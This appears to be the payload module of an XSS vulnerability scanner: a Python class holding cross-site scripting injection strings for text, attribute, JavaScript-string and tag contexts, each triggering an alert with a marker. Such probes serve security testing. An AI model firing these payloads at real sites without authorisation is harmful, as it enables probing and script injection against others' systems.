# scanner/payloads.py
import random
import string
from typing import List, Dict

class PayloadGenerator:
    """
    Context-aware XSS payload generator.
    Fully supports attribute-name context (required by VipraTech).
    """
    def __init__(self, marker: str = "VIPRA_XSS_9797"):
        self.marker = marker

        self.payloads: Dict[str, List[str]] = {
            "text": [
                f"<script>alert('{self.marker}')</script>",
                f"'><script>alert('{self.marker}')</script>",
                f"\"/><script>alert('{self.marker}')</script>",
            ],
            "attribute_value": [
                f"\" onmouseover=\"alert('{self.marker}')",
                f"' autofocus onfocus=alert('{self.marker}') x='",
                f"javascript:alert('{self.marker}')",
            ],
            "attribute_name": [          # REQUIRED
                f" {self.marker}=\"x\" onclick=\"alert('{self.marker}')\" x=\"",
                f" accesskey='X' onclick=alert('{self.marker}') x='X",
                f" onfocus=alert('{self.marker}') autofocus id=x",
            ],
            "js_string": [
                f"';alert('{self.marker}');//",
                f"\";alert('{self.marker}');//",   # ← This line was broken before
                f"}};alert('{self.marker}');//",
                f"));//alert('{self.marker}')//",
            ],
            "tag_name": [
                f"<img src=x onerror=alert('{self.marker}')>",
                f"<svg onload=alert('{self.marker}')>",
                f"<details open ontoggle=alert('{self.marker}')>",
            ]
        }

    def for_context(self, context: str) -> List[str]:
        return self.payloads.get(context, self.payloads["text"])

    def all_payloads(self) -> List[str]:
        all_p = []
        for ctx_payloads in self.payloads.values():
            all_p.extend(ctx_payloads)
        return all_p

    def get_marker(self) -> str:
        return self.marker